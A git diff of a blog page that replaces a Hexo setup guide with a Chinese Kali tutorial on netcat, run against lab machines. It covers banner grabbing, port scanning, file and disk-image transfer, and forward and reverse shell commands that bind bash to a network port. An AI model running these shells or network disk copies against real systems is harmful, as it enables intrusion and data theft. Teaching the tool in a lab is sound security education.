@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>hexo博客搭建 | 0xMJ&#39;s blog</title>
-  <meta name="keywords" content=" hexo ">
-  <meta name="description" content="hexo博客搭建 | 0xMJ&#39;s blog">
+  <title>kali渗透测试之Web渗透-工具-NETCAT | 0xMJ&#39;s blog</title>
+  <meta name="keywords" content=" NETCAT ">
+  <meta name="description" content="kali渗透测试之Web渗透-工具-NETCAT | 0xMJ&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="0xMJ&#39;s blog">
@@ -303,9 +303,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="w-hexo博客搭建" class="article article-type-w" itemscope itemprop="blogPost">
+        <article id="post-kali渗透测试之Web渗透-工具-NETCAT" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">hexo博客搭建</h1>
+        <h1 class="article-title">kali渗透测试之Web渗透-工具-NETCAT</h1>
     
     <div class="article-meta">
         
@@ -313,21 +313,21 @@
         
         <span class="book">
             
-            <a href="javascript:" data-rel="博客">博客</a>
+            <a href="javascript:" data-rel="Kali">Kali</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">hexo</a>
+            <a href="javascript:" class="color2">NETCAT</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2017-11-22 17:19:35'>2017-11-22 16:57</time>
+        创建时间:<time class="date" title='更新时间: 2018-02-27 19:44:10'>2018-02-27 19:38</time>
         
     </div>
     <div class="article-meta">
@@ -360,7 +360,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#建立github仓库"><span class="toc-text">建立github仓库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地安装Git"><span class="toc-text">本地安装Git</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#配置SSH"><span class="toc-text">配置SSH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安装Hexo"><span class="toc-text">安装Hexo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#安装前提"><span class="toc-text">安装前提</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#安装Hexo-1"><span class="toc-text">安装Hexo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修改主题"><span class="toc-text">修改主题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传之前"><span class="toc-text">上传之前</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传到github"><span class="toc-text">上传到github</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结：部署步骤"><span class="toc-text">总结：部署步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用hexo命令"><span class="toc-text">常用hexo命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Hexo主题的分类和标签设置："><span class="toc-text">3-Hexo主题的分类和标签设置：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#NC—–TELNET-banner"><span class="toc-text">NC—–TELNET/banner</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC—–传输文本信息"><span class="toc-text">NC—–传输文本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子取证"><span class="toc-text">远程电子取证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC—-传输文件-目录"><span class="toc-text">NC—-传输文件/目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC—–流媒体服务"><span class="toc-text">NC—–流媒体服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC—–端口扫描"><span class="toc-text">NC—–端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC—–远程克隆硬盘"><span class="toc-text">NC—–远程克隆硬盘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC—–远程控制"><span class="toc-text">NC—–远程控制</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -375,82 +375,275 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#hexo博客搭建</p>
-<p>##安装git,nodejs,npm，并了解相关基础知识<br>下载nodejs和git(<a href="https://git-scm.com/)并安装" target="_blank" rel="external">https://git-scm.com/)并安装</a></p>
-<p>确认安装成功</p>
-<h2 id="建立github仓库"><a href="#建立github仓库" class="headerlink" title="建立github仓库"></a>建立github仓库</h2><p>新建一个名为你的用户名.github.io的仓库，比如说，如果你的github用户名是test，那么你就新建test.github.io的仓库（必须是你的用户名，其它名称无效），将来你的网站访问地址就是 <a href="http://test.github.io" target="_blank" rel="external">http://test.github.io</a> 了，是不是很方便？</p>
-<p>由此可见，每一个github账户最多只能创建一个这样可以直接使用域名访问的仓库。</p>
-<p>几个注意的地方：</p>
-<blockquote>
-<p>注册的邮箱一定要验证，否则不会成功；<br>仓库名字必须是：username.github.io，其中username是你的用户名；<br>仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久，我的等了半个小时才生效；<br>创建成功后，默认会在你这个仓库里生成一些示例页面，以后你的网站所有代码都是放在这个仓库里啦。</p>
-</blockquote>
-<h2 id="本地安装Git"><a href="#本地安装Git" class="headerlink" title="本地安装Git"></a>本地安装Git</h2><p>进入 Git 官网，下载相应的 Git 版本，下载完成之后按照引导安装 Git 。安装完成之后在开始菜单中会有一个 Git Bash 。这是一个类似于Liunx的终端，在里面可以模拟Linux下的终端进行操作。</p>
-<h2 id="配置SSH"><a href="#配置SSH" class="headerlink" title="配置SSH"></a>配置SSH</h2><p>打开 Git Bash ，执行下面的命令生成 SSH 访问私钥及公钥。</p>
-<p>$ ssh-keygen -t rsa -C “email@email.com”<br>ssh | 300*0<br>输入命令回车之后会提示你输入一些东西，不用管。一直回车到底就好了。然后你的 ~/.ssh 文件下就会生成两个文件 id_rsa 和 id_rsa.pub 。</p>
-<p>打开你的 Github -&gt; setting -&gt; SSH Keys 。然后点击 New SSH Key 创建一个新的SSH Key。Title 可以用你的计算机名，可以用以区分。将文件 id_rsa.pub 中的所以内容复制粘贴到 Key 下面。然后使用下面的命令测试是否可以连接上 Github 。</p>
-<p>$ ssh -T git@github.com<br><img src="http://oy0tigw51.bkt.clouddn.com/201711210154_534.png" alt=""></p>
-<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>Hexo的安装在其官方文档中有很详细的说明。下面将简单介绍Hexo的安装。</p>
-<h4 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h4><p>安装 Node.js ，请进入Node.js 的官网下载安装。<br>安装 Git ，前面已经说明，不再赘述。</p>
-<h4 id="安装Hexo-1"><a href="#安装Hexo-1" class="headerlink" title="安装Hexo"></a>安装Hexo</h4><p>上面两个工具安装完整之后，打开 Git Bash ，只需要使用npm即可完成Hexo的安装。</p>
-<p>$ npm install -g hexo-cli<br>安装Hexo完成之后，执行下面的命令，Hexo将会在你制定的文件夹中新建所需要的文件。</p>
-<p>$ hexo init <folder><br>$ cd <folder><br>$ npm install<br>新建完成后，文件夹下的目录如下：</folder></folder></p>
-<p>.<br>├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── source<br>|   ├── _drafts<br>|   └── _posts<br>└── themes<br>_config.yml 文件是网站的配置文件，可以在其中配置网站的大部分参数。<br>package.json 文件是应用程序的信息。<br>source 是资源文件夹，是用来存放用户资源的地方。<br>themes 是主题文件夹，Hexo会根据主题来生成不同的静态页面。<br>scaffolds是模板件夹，当新建文章的时候，Hexo会根据模板来建立文件。</p>
-<h2 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h2><p><a href="https://github.com/yelog/hexo-theme-3-hexo首先下载这个主题：" target="_blank" rel="external">https://github.com/yelog/hexo-theme-3-hexo首先下载这个主题：</a></p>
-<pre><code>$ cd /f/Workspaces/hexo/
-$ git clone https://github.com/yelog/hexo-theme-3-hexo themes/3-hexo
-</code></pre><p>修改_config.yml中的theme: landscape改为theme: 3-hexo，然后重新执行hexo g来重新生成。</p>
-<p>如果出现一些莫名其妙的问题，可以先执行hexo clean来清理一下public的内容，然后再来重新生成和发布。</p>
-<h2 id="上传之前"><a href="#上传之前" class="headerlink" title="上传之前"></a>上传之前</h2><p>在上传代码到github之前，一定要记得先把你以前所有代码下载下来（虽然github有版本管理，但备份一下总是好的），因为从hexo提交代码时会把你以前的所有代码都删掉。</p>
-<h2 id="上传到github"><a href="#上传到github" class="headerlink" title="上传到github"></a>上传到github</h2><p>如果你一切都配置好了，发布上传很容易，一句hexo d就搞定，当然关键还是你要把所有东西配置好。</p>
-<p>首先，ssh key肯定要配置好。</p>
-<p>其次，配置_config.yml中有关deploy的部分：</p>
-<p>正确写法：</p>
-<p>deploy:<br>  type: git<br>  repository: git@github.com:liuxianan/liuxianan.github.io.git<br>  branch: master</p>
-<p>错误写法：</p>
-<p>deploy:<br>  type: github<br>  repository: <a href="https://github.com/liuxianan/liuxianan.github.io.git" target="_blank" rel="external">https://github.com/liuxianan/liuxianan.github.io.git</a><br>  branch: master</p>
-<h2 id="总结：部署步骤"><a href="#总结：部署步骤" class="headerlink" title="总结：部署步骤"></a>总结：部署步骤</h2><p>每次部署的步骤，可按以下三步来进行。</p>
-<p>hexo clean<br>hexo generate<br>hexo deploy</p>
-<ol>
-<li><p>总结：本地调试</p>
-</li>
-<li><p>在执行下面的命令后，</p>
-</li>
-</ol>
-<p>$ hexo g #生成<br>$ hexo s #启动本地服务，进行文章预览调试<br>浏览器输入<a href="http://localhost:4000，查看搭建效果。此后的每次变更_config.yml" target="_blank" rel="external">http://localhost:4000，查看搭建效果。此后的每次变更_config.yml</a> 文件或者新建文件都可以先用此命令调试，尤其是当你想调试新添加的主题时。</p>
-<ol>
-<li>可以用简化的一条命令</li>
-</ol>
-<p>hexo s -g</p>
-<h2 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h2><p>hexo clean 清除<br>hexo s -g #生成并本地预览<br>hexo d -g #生成并上传<br>hexo server –debug  # 本地部署<br>hexo generate or hexo g  # 生成页面<br>hexo deployer or hexo d  # 部署到github<br>hexo new “title”  # 新建文章<br>hexo new page “about”  # 创建新页面</p>
-<h2 id="3-Hexo主题的分类和标签设置："><a href="#3-Hexo主题的分类和标签设置：" class="headerlink" title="3-Hexo主题的分类和标签设置："></a>3-Hexo主题的分类和标签设置：</h2><p>这里遇到了坑<br>发了邮件问了这个主题的开发者<br>我以为是要用next主题形式创建hexo new page “ca”</p>
-<pre><code>代码：
-tags: 
-- 前端
-- hexo
-categories: 
-- 前端
-在博客根目录输入
+        <p>#kali渗透测试之Web渗透-工具-NETCAT</p>
+<p>##NETCAT(传输文件/目录、流媒体服务、端口扫描、远程克隆硬盘)<br>网络工具中的瑞士军刀——小身材、大智慧<br>侦听模式/传输模式<br>telnet/获取banner信息<br>传输文本信息<br>传输文件目录<br>加密传输文件<br>远程控制/木马<br>加密所有流量<br>流媒体服务器<br>远程克隆硬盘</p>
+<h3 id="NC—–TELNET-banner"><a href="#NC—–TELNET-banner" class="headerlink" title="NC—–TELNET/banner"></a>NC—–TELNET/banner</h3><p>nc -nv 1.1.1.1 10<br>nc -nv 1.1.1.1 25<br>nc -nv 1.1.1.1 80<br>root:~# nc -h               //它的基本用法<br> root:~# nc -v               //端口扫描<br>root:~# mtr 200.106.0.20    //追踪一下路由<br>root:~# nc -vn              //显示详细的终端信息，不会Dns解析<br>root:~# ping pop3. 163.com<br>//连接ip邮箱（客户端链接服务器端）<br>root:~# nc -vn 123.125.50.29 110<br>USER<br>USER 12asdfg<br>USER ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==</p>
+<p>root:~# base64<br>fanghong.yuan@163.com<br>（按ctrl+d邮箱编码成：ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==）</p>
+<p>root:~# ping smtp.163.com</p>
+<p>root:~# nc -nv 123.125.20.138 25</p>
+<pre><code>220 163.com Anti-spam GT for Coremail System(163com[20141201])
 
-hexo new page tags
-打开 tags/index.md ，并改成：
+ehlo
 
-title: 标签
-date: 日期
-type: &quot;tags&quot;
-comments: false
-分类同理
+500 Errot: bad syntax
 
-hexo new page categories
-打开category/index.md，改为：
+ehlo yuanfh
 
-title: 分类
-date: 日期
-type: &quot;categories&quot;
-comments: false
-</code></pre><p>实际上不需要 ，大概浪费了我两天时间的坑。<br>这个侧边栏分类无须单独配置，只要在文章中加入 categories</p>
-<p>比如创建了一篇文章如下，加入 categories: 大前端， 这样就会在侧边栏自动出现 大前端 这个分类，且所有有 categories: 大前端 这个参数的文章都会归到这个分类下。<br>这个主题贼强 自动添加文集分类</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201711221651_585.png" alt=""></p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201711221651_329.png" alt=""></p>
+250-mail
+
+250-PIPELINING
+
+250-AUTH LOGIN PLAIN
+
+250-AUTH=LOGIN PLAIN
+
+250-coremail 1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj
+
+250-ARARTTLS
+
+250 8BIMIME
+
+AUTH LOGIN
+
+344 dxNLcm5hbWU6
+
+fanghong.yuan@163.com
+
+535 Error: authentication failed
+</code></pre><p>root:~# nc -nv 123.125.20.138 25</p>
+<pre><code>220 163.com Anti-spam GT for Coremail System(163com[20141201])
+
+ehlo
+
+500 Errot: bad syntax
+
+ehlo yuanfh
+
+250-mail
+
+250-PIPELINING
+
+250-AUTH LOGIN PLAIN
+
+250-AUTH=LOGIN PLAIN
+
+250-coremail 1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj
+
+250-ARARTTLS
+
+250 8BIMIME
+
+AUTH LOGIN
+
+344 dxNLcm5hbWU6
+
+&lt;fanghong.yuan@163.com&gt;
+
+535 Error: authentication failed
+</code></pre><p>root:~# nc -nv 10.1.1.11 80</p>
+<pre><code>(UNKNOWN) [10.1.1.11] 80 (http) open
+
+head /
+
+&lt;html&gt;&lt;head&gt;&lt;titile&gt;Metasploitable2 - Linux&lt;/title&gt;&lt;/head&gt;&lt;body&gt;
+
+&lt;pre&gt;
+
+warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+&lt;/pre&gt;
+
+&lt;ul&gt;
+
+&lt;li&gt;&lt;a href=&quot;/twiki/&quot;&gt;Twiki&lt;/a&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;a href=&quot;/phpMyAdmin/&quot;&gt;phpMyAdmin&lt;/a&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;a href=&quot;/mutillidae/&quot;&gt;Mutillidae&lt;/a&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;a href=&quot;/dvwa/&quot;&gt;DVWA&lt;/a&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;a href=&quot;/dav/&quot;&gt;wevDAV&lt;/a&gt;&lt;/li&gt;
+
+&lt;/ul&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre><h3 id="NC—–传输文本信息"><a href="#NC—–传输文本信息" class="headerlink" title="NC—–传输文本信息"></a>NC—–传输文本信息</h3><p>A: nc -l -p 4444</p>
+<p>B: nc -nv 1.1.1.1 4444</p>
+<p>远程电子取证信息收集</p>
+<p>开启两台系统kalix64和kalix32</p>
+<p>kali 32Bit</p>
+<p>root@kali:~# nc -l -p 333       //打开端口333</p>
+<p>root@kali:~# netstat -pantu | grep 333     //查看端口33是否打开<br>ifconfig查看地址：10.1.1.12<br>kali 64Bit</p>
+<p>root:~# nc -nv 10.1.1.12 333</p>
+<p>(UNKNOWN) [10.1.1.12] 333 (?) open<br><img src="http://oy0tigw51.bkt.clouddn.com/201802271914_628.png" alt=""><br>然后两台电脑实现聊天的功能！</p>
+<h3 id="远程电子取证"><a href="#远程电子取证" class="headerlink" title="远程电子取证"></a>远程电子取证</h3><p>kali 32Bit</p>
+<p>root@kali:~# nnc -l -p 333       //打开端口333</p>
+<p>kali 64Bit</p>
+<p>root:~# ls -l | nc -nv 10.1.1.12 333</p>
+<p>(UNKNOWN) [10.1.1.12] 333 (?) open</p>
+<p>root:~# ps aux              //查看可疑的进程</p>
+<p>kali 32Bit</p>
+<p>root@kali:~# nc -l -p 333 &gt; ps.txt   监听333端口有信息重定向到ps.txt文件里</p>
+<p>kali 64Bit<br>root:~# ps aux | nc -nv 10.1.1.12 333 -q 1<br>(UNKNOWN) [10.1.1.12] 333 (?) open</p>
+<p>kali 32Bit<br>root@kali:~# cat ps.txt         //查看ps.txt文件<br>kali 32Bit<br>root@kali:~# nc -l -p 333 &gt; lsof.txt</p>
+<p>kali 64Bit</p>
+<p>root:~# lsof | nc -nv 10.1.1.12 333 -q 1</p>
+<p>(UNKNOWN) [10.1.1.12] 333 (?)  open</p>
+<p>kali 32Bit</p>
+<p>root@kali:~# more lsof.txt    //这个文件比较多，所以用more查看文件</p>
+<h3 id="NC—-传输文件-目录"><a href="#NC—-传输文件-目录" class="headerlink" title="NC—-传输文件/目录"></a>NC—-传输文件/目录</h3><p>传输文件</p>
+<pre><code>A: nc -lp 333 &gt; 1.mp4 侦听此端口 接受文件
+
+B: nc -nv 1.1.1.1. 333 &lt; 1.mp4 - q 1 发送到A的计算机 只连接一秒
+
+或
+
+A: nc -q -lp 333 &lt; a.mp4 把视频文件放到333侦听端口 发送
+
+B: nc -nv 1.1.1.1 333 &gt; 2.mp4 客户端链接的得到文件
+</code></pre><p>传输目录</p>
+<pre><code>A: tar -cvf - music/ | nc -lp 333 - q 1
+
+B: nc -nv 1.1.1.1 333 | tar -xvf -
+</code></pre><p>加密传文件</p>
+<pre><code>A: nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4          文件解密
+
+B:  mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1     文件加密
+</code></pre><p>A:</p>
+<p>root:~/Desktop# nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4 </p>
+<p>Enter passphrase: xxxx </p>
+<p>B:</p>
+<p>root:~/Desktop# mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</p>
+<p>Enter the passphrase (maximum of 512 characters)</p>
+<p>Please use a combination of upper and lower case letters and numbers.</p>
+<p>Enter passhrase: (UNKNOWN) [10.1.1.12] 333 (?) open</p>
+<p>en</p>
+<p>Enter passphrase: xxxx</p>
+<p>NC不自带mcrypt,需要自己安装！</p>
+<h3 id="NC—–流媒体服务"><a href="#NC—–流媒体服务" class="headerlink" title="NC—–流媒体服务"></a>NC—–流媒体服务</h3><pre><code>A: cat 1.mp4 | nc -lp 333
+
+B: nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -
+</code></pre><h3 id="NC—–端口扫描"><a href="#NC—–端口扫描" class="headerlink" title="NC—–端口扫描"></a>NC—–端口扫描</h3><p>  nc -nvz 1.1.1.1 -65536</p>
+<p>  nc -vnzu 1.1.1.1 1-1024</p>
+<p>root@1kali:~# nc -h</p>
+<p>[v1.10-38]</p>
+<p>connect to somewhere:   nc [-options] hostname port[s] [ports] … </p>
+<p>listen for inbound: nc -l -p port [-options] [hostname] [port]</p>
+<p>options:</p>
+<pre><code>-c shell commands   as `-e&#39;; use /bin/sh to exec [dangerous!!]
+
+-e filename     program to exec after connect [dangerous!!]
+
+-b          allow broadcasts
+
+-g gateway      source-routing hop point[s], up to 8                          设置路由器跃程通信网关，最高可设置8个。
+
+-G num          source-routing pointer: 4, 8, 12, ...                         设置来源路由指向器，其数值为4的倍数。
+
+-h          this cruft 
+
+-i secs         delay interval for lines sent, ports sca                      延时的间隔
+
+    -k                      set keepalive option on socket
+
+-l          listen mode, for inbound connects                             监听模式,入站连接
+
+-n          numeric-only IP addresses, no DNS                             直接使用ip地址,而不用域名服务器
+
+-o file         hex dump of traffic                                           指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。
+
+-p port         local port number                                             本地端口
+
+-r          randomize local and remote ports                              随机本地和远程端口 
+
+-q secs         quit after EOF on stdin and delay of secs
+
+-s addr         local source address  
+
+-T tos          set Type Of Service
+
+-t          answer TELNET negotiation   
+
+-u          UDP mode                                                      udp  模式
+
+-v          verbose [use twice to be more verbose]                        显示过程,vv 更多
+
+-w secs         timeout for connects and final net reads                      等待连接超时
+
+-z          zero-I/O mode [used for scanning]                             使用输入/输出模式，只在扫描通信端口时使用。
+</code></pre><h3 id="NC—–远程克隆硬盘"><a href="#NC—–远程克隆硬盘" class="headerlink" title="NC—–远程克隆硬盘"></a>NC—–远程克隆硬盘</h3><pre><code> A: nc -lp 333 | dd of=/dev/sda
+
+ B: dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1
+</code></pre><p>远程电子取证，可以讲目标服务器远程复制，或者内存。</p>
+<h3 id="NC—–远程控制"><a href="#NC—–远程控制" class="headerlink" title="NC—–远程控制"></a>NC—–远程控制</h3><p>正向：</p>
+<pre><code>A: nc  -lp 333 -  bash
+
+B: nc  1.1.1.1 333
+</code></pre><p>反向：</p>
+<pre><code>A: nc -nv 1.1.1.1 333
+
+B: nc -lp 333 -c bash
+</code></pre><p>注：Windows用户把bash改成cmd;</p>
+<p>root@kali:~# ifconfig</p>
+<p>eth0      Link encap:Ethernet  HWaddr 00:0c:29:c6:89:56  </p>
+<pre><code>      inet addr:192.168.198.130  Bcast:192.168.198.255  Mask:255.255.255.0
+
+      inet6 addr: fe80::20c:29ff:fec6:8956/64 Scope:Link
+
+      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+
+      RX packets:46 errors:0 dropped:0 overruns:0 frame:0
+
+      TX packets:49 errors:0 dropped:0 overruns:0 carrier:0
+
+      collisions:0 txqueuelen:1000 
+
+      RX bytes:6770 (6.6 KiB)  TX bytes:8161 (7.9 KiB)
+
+      Interrupt:19 Base address:0x2000 
+</code></pre><p>lo        Link encap:Local Loopback  </p>
+<pre><code>      inet addr:127.0.0.1  Mask:255.0.0.0
+
+      inet6 addr: ::1/128 Scope:Host
+
+      UP LOOPBACK RUNNING  MTU:65536  Metric:1
+
+      RX packets:20 errors:0 dropped:0 overruns:0 frame:0
+
+      TX packets:20 errors:0 dropped:0 overruns:0 carrier:0
+
+      collisions:0 txqueuelen:0 
+
+      RX bytes:1200 (1.1 KiB)  TX bytes:1200 (1.1 KiB)
+</code></pre><p>A:</p>
+<p>root@kali:~# nc -nv 192.168.1.115 333 -c bash </p>
+<p>(UNKNOWN) [192.168.1.115] 333 (?) open</p>
+<p>ls </p>
+<p>pwd</p>
+<p>没有任何反应</p>
+<p>B:</p>
+<p>root:~# nc -lp 333</p>
+<p>ls</p>
+<p>Desktop</p>
+<p>/root</p>
+<p>ifconfig</p>
+<p>……(一串文字）</p>
+<p>请求来控制我！</p>
+<p>NC—–NCAT</p>
+<p>  Nc缺乏就加密和身份验证的能力</p>
+<p>  Ncat包含于nmap工具包中</p>
+<p>  A: ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl</p>
+<p>  B: ncat -nv 1.1.1.1 333 –ssl</p>
+<p>不同系统/平台的nc参数功能不尽相同</p>
+<p>root:~# man nc</p>
+<p>root:~# nc -h</p>
 
       
        <hr><span style="font-style: italic;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 951207194@qq.com </span>
